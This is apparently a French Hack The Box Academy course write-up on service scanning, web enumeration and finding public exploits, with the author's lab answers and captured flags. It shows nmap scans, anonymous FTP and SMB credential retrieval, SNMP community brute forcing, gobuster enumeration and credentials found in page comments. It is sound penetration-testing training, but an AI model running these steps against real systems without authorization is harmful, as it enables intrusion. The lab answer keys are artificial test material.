|_drwxr-xr-x    2 ftp      ftp          4096 Dec 19 23:50 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.78 seconds
```

Connectons-nous au service en utilisant l'utilitaire de ligne de commande ftp.

```bash
Arcony@htb[/htb]$ ftp -p 10.129.42.253

Connected to 10.129.42.253.
220 (vsFTPd 3.0.3)
Name (10.129.42.253:user): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
227 Entering Passive Mode (10,129,42,253,158,60).
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Feb 25 19:25 pub
226 Directory send OK.

ftp> cd pub
250 Directory successfully changed.

ftp> ls
227 Entering Passive Mode (10,129,42,253,182,129).
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            18 Feb 25 19:25 login.txt
226 Directory send OK.

ftp> get login.txt
local: login.txt remote: login.txt
227 Entering Passive Mode (10,129,42,253,181,53).
150 Opening BINARY mode data connection for login.txt (18 bytes).
226 Transfer complete.
18 bytes received in 0.00 secs (165.8314 kB/s)

ftp> exit
221 Goodbye.
```

Dans l'interface FTP ci-dessus, nous constatons que le protocole prend en charge les commandes courantes telles que `cd` et `ls` et permet de télécharger des fichiers grâce à la commande `get`. L'examen du fichier `login.txt` téléchargé révèle des identifiants que nous pourrions utiliser pour accéder au système.


```bash
Arcony@htb[/htb]$ cat login.txt 

admin:ftp@dmin123
```

### SMB

Le protocole `SMB` (**Server Message Block**) est très répandu sur les machines Windows et offre de nombreuses failles de sécurité, tant verticales que horizontales. Des données sensibles, notamment des identifiants, peuvent se trouver sur des partages de fichiers réseau, et certaines versions de SMB sont vulnérables aux attaques `RCE` (**exécution de code à distance**) telles qu'[EternalBlue](https://www.avast.com/c-eternalblue). Il est donc crucial d'analyser avec soin cette importante surface d'attaque potentielle. `Nmap` propose plusieurs scripts pour l'analyse SMB, comme [smb-os-discovery.nse](https://nmap.org/nsedoc/scripts/smb-os-discovery.html), qui interagit avec le service SMB pour extraire la version du système d'exploitation.

```bash
Arcony@htb[/htb]$ nmap --script smb-os-discovery.nse -p445 10.10.10.40

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-27 00:59 GMT
Nmap scan report for doctors.htb (10.10.10.40)
Host is up (0.022s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: CEO-PC
|   NetBIOS computer name: CEO-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-12-27T00:59:46+00:00

Nmap done: 1 IP address (1 host up) scanned in 2.71 seconds
```

Dans ce cas précis, l'hôte exécute un système d'exploitation Windows 7 ancien, et nous pourrions effectuer une analyse plus approfondie pour confirmer sa vulnérabilité à **EternalBlue**. Le `framework Metasploit` propose plusieurs [modules](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/) pour EternalBlue permettant de valider et d'exploiter cette vulnérabilité, comme nous le verrons plus loin. Nous pouvons lancer une analyse de notre cible pour recueillir des informations sur le service SMB. Nous pouvons ainsi déterminer que l'hôte exécute un **noyau Linux, Samba version 4.6.2**, et que son nom d'hôte est **GS-SVCSCAN**.

```bash
Arcony@htb[/htb]$ nmap -A -p445 10.129.42.253

Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:29 EST
Nmap scan report for 10.129.42.253
Host is up (0.11s latency).

PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 4.6.2
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

Host script results:
|_nbstat: NetBIOS name: GS-SVCSCAN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-25T21:30:06
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   111.62 ms 10.10.14.1
2   111.89 ms 10.129.42.253

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.72 seconds
```

#### Shares

Le protocole SMB permet aux utilisateurs et aux administrateurs de partager des dossiers et de les rendre accessibles à distance. Ces partages contiennent souvent des fichiers renfermant des informations sensibles, comme des mots de passe. L'outil [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) permet d'énumérer les partages SMB et d'interagir avec eux. L'option `-L` indique que l'on souhaite récupérer la liste des partages disponibles sur l'hôte distant, tandis que l'option `-N` supprime l'invite de mot de passe.

```bash
Arcony@htb[/htb]$ smbclient -N -L \\\\10.129.42.253

    Sharename       Type      Comment
    ---------       ----      -------
    print$          Disk      Printer Drivers
    users           Disk      
    IPC$            IPC       IPC Service (gs-svcscan server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

Ceci révèle les utilisateurs de partage non par défaut. Essayons de nous connecter en tant qu'utilisateur invité.

```bash
Arcony@htb[/htb]$ smbclient \\\\10.129.42.253\\users

Enter WORKGROUP\users's password: 
Try "help" to get a list of possible commands.

smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*

smb: \> exit
```

La commande **ls** a renvoyé un message d'accès refusé, indiquant que l'accès invité n'est pas autorisé. Essayons à nouveau avec les identifiants de l'utilisateur bob (**bob:Welcome1**).

```bash
Arcony@htb[/htb]$ smbclient -U bob \\\\10.129.42.253\\users

Enter WORKGROUP\bob's password: 
Try "help" to get a list of possible commands.

smb: \> ls
  .                                   D        0  Thu Feb 25 16:42:23 2021
  ..                                  D        0  Thu Feb 25 15:05:31 2021
  bob                                 D        0  Thu Feb 25 16:42:23 2021

        4062912 blocks of size 1024. 1332480 blocks available
        
smb: \> cd bob

smb: \bob\> ls
  .                                   D        0  Thu Feb 25 16:42:23 2021
  ..                                  D        0  Thu Feb 25 16:42:23 2021
  passwords.txt                       N      156  Thu Feb 25 16:42:23 2021

        4062912 blocks of size 1024. 1332480 blocks available
        
smb: \bob\> get passwords.txt 
getting file \bob\passwords.txt of size 156 as passwords.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```

Nous avons réussi à accéder au partage des utilisateurs en utilisant leurs identifiants et avons ainsi pu accéder au fichier intéressant `passwords.txt`, qui peut être téléchargé avec la commande `get`.

#### SNMP

Les chaînes de communauté SNMP fournissent des informations et des statistiques sur un **routeur ou un périphérique**, permettant ainsi d'y accéder. Les chaînes de communauté par défaut du fabricant (**publique et privée**) restent généralement inchangées. Dans les versions 1 et 2c de SNMP, l'accès est contrôlé par une chaîne de communauté en clair; connaître le nom du périphérique permet d'y accéder. Le chiffrement et l'authentification n'ont été ajoutés qu'à partir de la version 3 de SNMP. De nombreuses informations peuvent être obtenues grâce à SNMP. L'examen des paramètres de processus peut révéler les identifiants transmis en ligne de commande, qui peuvent être réutilisés pour d'autres services accessibles depuis l'extérieur, compte tenu de la fréquence de réutilisation des mots de passe en entreprise. Les informations de routage, les services associés à des interfaces supplémentaires et la version des logiciels installés peuvent également être révélés.

```bash
Arcony@htb[/htb]$ snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0

iso.3.6.1.2.1.1.5.0 = STRING: "gs-svcscan"
```

```bash
Arcony@htb[/htb]$ snmpwalk -v 2c -c private  10.129.42.253 

Timeout: No Response from 10.129.42.253
```

Un outil tel que [onesixtyone](https://github.com/trailofbits/onesixtyone) peut être utilisé pour trouver par force brute les noms de chaînes de communauté en utilisant un fichier de dictionnaire de chaînes de communauté courantes tel que le fichier `dict.txt` inclus dans le dépôt GitHub de l'outil.

```bash
Arcony@htb[/htb]$ onesixtyone -c dict.txt 10.129.42.254

Scanning 1 hosts, 51 communities
10.129.42.254 [public] Linux gs-svcscan 5.4.0-66-generic #74-Ubuntu SMP Wed Jan 27 22:54:38 UTC 2021 x86_64
```

### Conclusion

L'analyse et l'énumération des services constituent un vaste sujet que nous approfondirons au fil de notre lecture. Les aspects abordés ici s'appliquent à de nombreux réseaux, y compris aux machines HTB.

---

**Perform an Nmap scan of the target. What does Nmap display as the version of the service running on port 8080?**

Ok donc je lance un scan avec nmap et voici ce que ça me donne :

```bash
┌─[eu-academy-3]─[10.10.14.57]─[htb-ac-1999270@htb-krynrhhtsg]─[~]
└──╼ [★]$ nmap -sC -sV 10.129.18.7
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-07 16:20 CST
Nmap scan report for 10.129.18.7
Host is up (0.044s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.57
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Feb 25  2021 pub
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:01:d7:79:e9:d2:09:2a:b8:d9:b4:9a:6c:00:0c:1c (RSA)
|   256 2b:99:b2:1f:ec:1a:5a:c6:b7:be:b5:50:d1:0e:a9:df (ECDSA)
|_  256 e4:f8:17:8d:d4:71:d1:4e:d4:0e:bd:f0:29:4f:6d:14 (ED25519)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: PHP 7.4.3 - phpinfo()
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
2323/tcp open  telnet      Linux telnetd
8080/tcp open  http        Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-11-07T22:20:27
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -16s
|_nbstat: NetBIOS name: GS-SVCSCAN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.31 seconds
```

J'ai mis le `-sC` et `-sV` pour avoir un maximum d'info sur l'output du nmap et comme on peut le voir la version du logiciel qui est utilisé sur le port 8080 est : **Apache Tomcat**

**Réponse :** `Apache Tomcat`

**Perform an Nmap scan of the target and identify the non-default port that the telnet service is running on.**

Dans l'output de nmap montré précédemment on peut y observer un port asser étrange pour `telnet` qui est le **2323**

**Réponse :** `2323`

**List the SMB shares available on the target host. Connect to the available share as the bob user. Once connected, access the folder called 'flag' and submit the contents of the flag.txt file.**

Voici ce que le résultat de la commande `smbclient` m'a donné :

```bash
┌─[eu-academy-3]─[10.10.14.57]─[htb-ac-1999270@htb-krynrhhtsg]─[~]
└──╼ [★]$ smbclient -N -L 10.129.18.7

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	users           Disk      
	IPC$            IPC       IPC Service (gs-svcscan server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

> Attention a mettre le flag `-N` qui désactive la demande de mot de passe avant le `-L` sinon ça demande un mot de passe
{: .prompt-danger}

Une fois qu'on connait le nom de ces dossiers, on peut essayer de se connecter avec l'utilisateur `bob` comme demandé avec le `-U` et si on regarde bien la leçon on nous donne déjà le mot de passe qui est `Welcome 1`

Maintenant nous pouvons nous connecter avec le `smbclient` comme ceci

```bash
┌─[eu-academy-3]─[10.10.14.57]─[htb-ac-1999270@htb-dghpketfwh]─[~]
└──╼ [★]$ smbclient -U bob \\\\10.129.18.7\\users
Password for [WORKGROUP\bob]:
Try "help" to get a list of possible commands.
smb: \> get flag.txt
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \flag.txt
smb: \> cat flag.txt
cat: command not found
smb: \> cd flag
smb: \flag\> ls
  .                                   D        0  Thu Feb 25 17:09:26 2021
  ..                                  D        0  Thu Feb 25 17:06:52 2021
  flag.txt                            N       33  Thu Feb 25 17:09:26 2021

		4062912 blocks of size 1024. 1277732 blocks available
smb: \flag\> get flag.txt
getting file \flag\flag.txt of size 33 as flag.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \flag\> exit
┌─[eu-academy-3]─[10.10.14.57]─[htb-ac-1999270@htb-dghpketfwh]─[~]
└──╼ [★]$ cat flag.txt 
dceece590f3284c3866305eb2473d099
┌─[eu-academy-3]─[10.10.14.57]─[htb-ac-1999270@htb-dghpketfwh]─[~]
└──╼ [★]$ smbclient -U bob \\\\10.129.18.7\\users
Password for [WORKGROUP\bob]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Feb 25 17:06:52 2021
  ..                                  D        0  Thu Feb 25 14:05:31 2021
  flag                                D        0  Thu Feb 25 17:09:26 2021
  bob                                 D        0  Thu Feb 25 15:42:23 2021

		4062912 blocks of size 1024. 1277724 blocks available
smb: \> cd flag
smb: \flag\> ls
  .                                   D        0  Thu Feb 25 17:09:26 2021
  ..                                  D        0  Thu Feb 25 17:06:52 2021
  flag.txt                            N       33  Thu Feb 25 17:09:26 2021

		4062912 blocks of size 1024. 1277720 blocks available
smb: \flag\> get flag.txt
getting file \flag\flag.txt of size 33 as flag.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \flag\> exit
┌─[eu-academy-3]─[10.10.14.57]─[htb-ac-1999270@htb-dghpketfwh]─[~]
└──╼ [★]$ cat flag.txt 
dceece590f3284c3866305eb2473d099
```

Comme nous pouvons le voir j'entre le mot de passe de **bob** qui fonctionne et ensuite je peux voir avec la commande ls qu'il y a deux dossiers, un nommé `flag` et l'autre nommé `bob` car sur la droite nous voyons un `D` qui signifie Directory donc dossier.

Alors j'entre et je vois le fichier flag.txt que je récupère sur ma machine avec la commande `get` puis je sors et enfin je peux observer le contenu de celui ci avec `cat`

**Réponse :** `dceece590f3284c3866305eb2473d099`

## Web Enumeration

Lors de l'analyse des services, nous rencontrons fréquemment des serveurs web fonctionnant sur les ports **80 et 443**. Ces serveurs hébergent des applications web (parfois plusieurs), ce qui représente souvent une surface d'attaque considérable et une cible de grande valeur lors d'un test d'intrusion. Une énumération web rigoureuse est essentielle, notamment lorsqu'une organisation expose peu de services ou que ces services sont correctement mis à jour.

### Gobuster

Après avoir découvert une application web, il est toujours judicieux de vérifier si des fichiers ou répertoires cachés, non destinés à un accès public, sont présents sur le serveur web. On peut utiliser un outil comme [ffuf](https://github.com/ffuf/ffuf) ou [GoBuster](https://github.com/OJ/gobuster) pour effectuer cette **énumération de répertoires**. Il arrive parfois de découvrir des fonctionnalités cachées ou des pages/répertoires exposant des données sensibles, exploitables pour accéder à l'application web, voire exécuter du code à distance sur le serveur lui-même.

#### Directory/File Enumeration

GoBuster est un outil polyvalent permettant d'effectuer des `attaques par force brute` sur les **DNS**, les hôtes virtuels et les répertoires. Il offre des fonctionnalités supplémentaires, comme **l'énumération des compartiments S3 publics d'AWS**. Dans le cadre de ce module, nous nous intéressons aux modes d'attaque par force brute sur les répertoires (et les fichiers) spécifiés par l'option `dir`. Effectuons une analyse simple à l'aide de la liste de mots de passe `common.txt` de GoBuster.

```bash
Arcony@htb[/htb]$ gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.121/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/11 21:47:25 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.php (Status: 200)
/server-status (Status: 403)
/wordpress (Status: 301)
===============================================================
2020/12/11 21:47:46 Finished
===============================================================
```

Un code d'état `HTTP 200` indique que la requête vers la ressource a abouti, tandis qu'un code `403` signifie que l'accès à la ressource est interdit. Un code `301` indique une redirection en cours, ce qui ne constitue **pas un échec**. Il est utile de se familiariser avec les différents codes d'état HTTP, disponibles [ici](https://en.wikipedia.org/wiki/List_of_HTTP_status_codes). Le module `Web Requests` Academy aborde également les codes d'état HTTP plus en détail.

L'analyse s'est déroulée avec succès et a identifié une installation WordPress à l'adresse `/wordpress`. WordPress est le CMS (**Système de Gestion de Contenu**) le plus utilisé et présente une surface d'attaque potentielle considérable. Dans ce cas précis, l'accès à http://10.10.10.121/wordpress via un navigateur révèle que WordPress est encore en phase d'installation, ce qui nous permettrait d'exécuter du code à distance (RCE) sur le serveur.

![wordpress](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/wordpress.png)

#### DNS Subdomain Enumeration

Il peut également exister des ressources essentielles hébergées sur des sous-domaines, comme des panneaux d'administration ou des applications dotées de fonctionnalités supplémentaires susceptibles d'être exploitées. Nous pouvons utiliser **GoBuster** pour énumérer les sous-domaines disponibles d'un domaine donné en utilisant l'option `dns` pour spécifier le `mode DNS`. Commençons par [cloner le dépôt GitHub SecLists](https://github.com/danielmiessler/SecLists), qui contient de nombreuses listes utiles pour le **fuzzing** et l'exploitation :

#### Install SecLists

```bash
Arcony@htb[/htb]$ git clone https://github.com/danielmiessler/SecLists
```

```bash
Arcony@htb[/htb]$ sudo apt install seclists -y
```

Ensuite, ajoutez un serveur DNS, par exemple `1.1.1.1`, au fichier `/etc/resolv.conf`. Nous ciblerons le domaine `inlanefreight.com`, le site web d'une entreprise fictive de transport et de logistique.

```bash
Arcony@htb[/htb]$ gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt

===============================================================
Gobuster v3.0.1

par OJ Reeves (@TheColonial) et Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Domaine : inlanefreight.com
[+] Threads : 10
[+] Délai d’attente : 1 s
[+] Liste de mots : /usr/share/SecLists/Discovery/DNS/namelist.txt
===============================================================
2020/12/17 23:08:55 Démarrage gobuster
===============================================================
Trouvé : blog.inlanefreight.com

Trouvé : customer.inlanefreight.com

Trouvé : my.inlanefreight.com

Trouvé : ns1.inlanefreight.com

Trouvé : ns2.inlanefreight.com

Trouvé : ns3.inlanefreight.com
===============================================================
17/12/2020 23:10:34 Terminé
===============================================================
```

Cette analyse révèle plusieurs sous-domaines intéressants que nous pourrions examiner plus en détail. Le module « [Attaquer des applications Web avec Ffuf](https://academy.hackthebox.com/module/details/54) » fournit davantage d'informations sur l'énumération Web et le fuzzing.

### Web Enumeration Tips

Passons en revue quelques conseils supplémentaires d'énumération Web qui vous aideront à compléter les machines sur HTB et dans le monde réel.

#### Banner Grabbing / Web Server Headers

Dans la section précédente, nous avons abordé la récupération des bannières web à des fins générales. Les en-têtes de serveur web offrent un aperçu précis du contenu hébergé sur un serveur. Ils peuvent révéler le **framework applicatif utilisé**, les options d'authentification et identifier d'éventuelles lacunes en matière de sécurité ou des erreurs de configuration. Nous pouvons utiliser `cURL` pour récupérer ces informations depuis la ligne de commande. `cURL` constitue un outil essentiel pour nos tests d'intrusion; il est donc fortement recommandé de se familiariser avec ses nombreuses options.

```bash
Arcony@htb[/htb]$ curl -IL https://www.inlanefreight.com

HTTP/1.1 200 OK
Date: Fri, 18 Dec 2020 22:24:05 GMT
Server: Apache/2.4.29 (Ubuntu)
Link: <https://www.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/"
Link: <https://www.inlanefreight.com/>; rel=shortlink
Content-Type: text/html; charset=UTF-8
```

[EyeWitness](https://github.com/RedSiege/EyeWitness) est un autre outil pratique qui permet de prendre des captures d'écran d'applications Web cibles, de les identifier et de repérer les identifiants par défaut potentiels.

#### Whatweb

Nous pouvons **extraire la version** des serveurs web, des frameworks et des applications à l'aide de l'outil en ligne de commande `whatweb`. Ces informations nous permettent d'identifier les technologies utilisées et de rechercher d'éventuelles vulnérabilités.

```bash
Arcony@htb[/htb]$ whatweb 10.10.10.121

http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]
```

`Whatweb` est un outil pratique doté de nombreuses fonctionnalités permettant d'automatiser l'énumération des applications web sur un réseau.

```bash
Arcony@htb[/htb]$ whatweb --no-errors 10.10.10.0/24

http://10.10.10.11 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.11], PoweredBy[Red,nginx], Title[Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux], nginx[1.14.1]
http://10.10.10.100 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.100], Title[File Sharing Service]
http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]
http://10.10.10.247 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@cross-fit.htb], Frame, HTML5, HTTPServer[OpenBSD httpd], IP[10.10.10.247], JQuery[3.3.1], PHP[7.4.12], Script, Title[Fine Wines], X-Powered-By[PHP/7.4.12], X-UA-Compatible[ie=edge]
```

#### Certificates

Les **certificats SSL/TLS** constituent une autre source d'information potentiellement précieuse lorsque le protocole HTTPS est utilisé. En accédant à https://10.10.10.121/ et en consultant le certificat, on découvre les informations ci-dessous, notamment **l'adresse e-mail et le nom de l'entreprise**. Ces données pourraient être utilisées pour mener une **attaque de phishing** si cela fait partie du **périmètre d'une évaluation**.

![certificates](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/cert.png)

#### Robots.txt

Il est courant que les sites web contiennent un fichier `robots.txt`, dont le but est d'indiquer aux robots d'exploration des moteurs de recherche, tels que Googlebot, **quelles ressources sont accessibles ou non** à l'indexation. Ce fichier peut fournir des informations précieuses, comme l'emplacement des fichiers privés et des pages d'administration. Dans ce cas précis, on constate que le fichier `robots.txt` contient deux entrées d'interdiction.

![robot.txt](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/robots.png)

En accédant à http://10.10.10.121/private dans un navigateur, on découvre une page de connexion administrateur HTB.

![connexion](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/academy.png)

#### Source Code

Il est également judicieux de consulter le code source des pages web rencontrées. On peut appuyer sur `CTRL + U` pour afficher la fenêtre de code source dans un navigateur. Cet exemple révèle un commentaire de développeur contenant les identifiants d'un **compte de test**, qui pourraient servir à se connecter au site web.

![account](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/source.png)

---

**Try running some of the web enumeration techniques you learned in this section on the server above, and use the info you get to get the flag.**

Ok donc on nous demande de mettre en pratique ce que nous venons d'apprendre sur l'énumération des sites web, dans un premier temps je fais un simple `gobuster` sur la cible

```bash
┌─[eu-academy-3]─[10.10.14.57]─[htb-ac-1999270@htb-c1r7knwlcp]─[~]
└──╼ [★]$ gobuster dir -u http://83.136.252.27:41159 -w /usr/share/seclists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://83.136.252.27:41159
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 281]
/.htaccess            (Status: 403) [Size: 281]
/.hta                 (Status: 403) [Size: 281]
/index.php            (Status: 200) [Size: 990]
/robots.txt           (Status: 200) [Size: 45]
/server-status        (Status: 403) [Size: 281]
/wordpress            (Status: 301) [Size: 327] [--> http://83.136.252.27:41159/wordpress/]
Progress: 4723 / 4724 (99.98%)
===============================================================
Finished
===============================================================
```

Donc comme nous pouvons voir, la cible est un site wordpress et nous voyons que celui ci possède un fichier robots.txt que nous allons maintenant consulter

```txt
User-agent: *
Disallow: /admin-login-page.php
```

Maintenant nous savons que si nous nous rendons sur l'URL suivante ça nous donne une page de login pour admin : http://83.136.252.27:41159/admin-login-page.php. Il nous reste plus qu'a trouver le mot de passe et le nom d'utilisateur de celui ci.

Pour se faire, j'ai fait un `curl` simple de la page me permettant d'en inspecter le code source et bingo:

```html
┌─[eu-academy-3]─[10.10.14.57]─[htb-ac-1999270@htb-c1r7knwlcp]─[~]
└──╼ [★]$ curl 83.136.252.27:41159/admin-login-page.php

<!DOCTYPE html>
<html>
<style>
    body {
        background-color: #151D2B;
    }

    form {
        background-color: #1A2332;
        width: 25%;
        margin: auto;
        border-radius: 10px;
        color: white;
        font-family: Arial, Helvetica, sans-serif;
    }

    input[type=text],
    input[type=password] {
        background-color: #101927;
        width: 100%;
        padding: 12px 20px;
        margin: 8px 0;
        display: inline-block;
        border: 1px solid #101927;
        box-sizing: border-box;
        border-radius: 10px;
        color: white;
    }

    button {
        background-color: #2A86FF;
        color: white;
        padding: 14px 20px;
        margin: 8px 0;
        border: none;
        cursor: pointer;
        width: 100%;
        border-radius: 10px;
    }

    button:hover {
        opacity: 0.8;
    }

    .container {
        padding: 16px;
    }
</style>

<body>
                <form name='login' autocomplete='off' class='form' action='' method='post'>
            <div class='control'>
                <h1>
                    Admin Panel
                </h1>
            </div>
            <div class="container">
                <label for="username"><b>Username</b></label>
                <input name='username' placeholder='Username' type='text'>

                <label for="password"><b>Password</b></label>
                <input name='password' placeholder='Password' type='password'>

                <!-- TODO: remove test credentials admin:password123 -->

                <button type="submit" formmethod='post'>Login</button>
            </div>
        </form>
    </body>

</html>
```

Nous avons trouvé quelque chose de très important, un commentaire avec nom d'utilisateur + mot de passe laissé par erreur par un développeur et nous allons l'utiliser pour nous connecter

Et nous obtenons ceci :

**Réponse :** `HTB{w3b_3num3r4710n_r3v34l5_53cr375}`

## Public Exploits

Une fois les services exécutés sur les ports identifiés par notre analyse `Nmap`, la première étape consiste à vérifier si des failles de sécurité sont exploitées publiquement. Ces failles peuvent concerner des applications web et d'autres applications fonctionnant sur des ports ouverts, comme `SSH` ou `FTP`.

### Finding Public Exploits

De nombreux outils peuvent nous aider à rechercher des failles de sécurité publiques pour les différentes applications et services que nous pourrions rencontrer lors de la `phase d'énumération`. Une méthode consiste à rechercher le **nom de l'application suivi de « exploit »** sur Google pour voir si nous obtenons des résultats.

![exploit](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/77/google_smb.jpg)

`Searchsploit` est un outil bien connu à cet effet. Il permet de rechercher les **vulnérabilités/exploits** publics de n'importe quelle application. On peut l'installer avec la commande suivante :

```bash
Arcony@htb[/htb]$ sudo apt install exploitdb -y
```

Ensuite, nous pouvons utiliser `searchsploit` pour rechercher une application spécifique par son nom, comme suit :

```bash
Arcony@htb[/htb]$ searchsploit openssh 7.2

----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                     | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                               | linux/remote/45210.py
OpenSSH 7.2 - Denial of Service                                                                                              | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                      | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                                         | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                         | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                     | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                         | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                                                        | linux/remote/40113.txt
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

